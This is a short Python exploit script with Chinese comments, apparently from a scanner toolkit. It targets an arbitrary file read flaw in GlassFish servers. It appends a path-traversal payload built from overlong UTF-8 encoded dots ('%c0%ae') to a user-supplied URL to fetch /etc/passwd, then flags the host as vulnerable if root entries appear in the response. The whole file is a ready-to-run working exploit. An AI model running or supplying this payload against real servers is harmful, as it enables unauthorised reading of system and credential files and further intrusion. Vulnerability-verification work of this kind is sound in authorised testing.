#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: glassfish 任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2010-0144595
author: Lucifer
description: java 语音中会把 "%c0%ae" 解析为 "\uC0AE" ，最后转义为 ASCCII 字符的 "." （点）。读取任意文件。
'''
import sys
import requests
import warnings
from termcolor import cprint

class glassfish_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"/bin/bash" in req.text and r"root:" in req.text:
                cprint("[+]存在glassfish 任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = glassfish_fileread_BaseVerify(sys.argv[1])
    testVuln.run()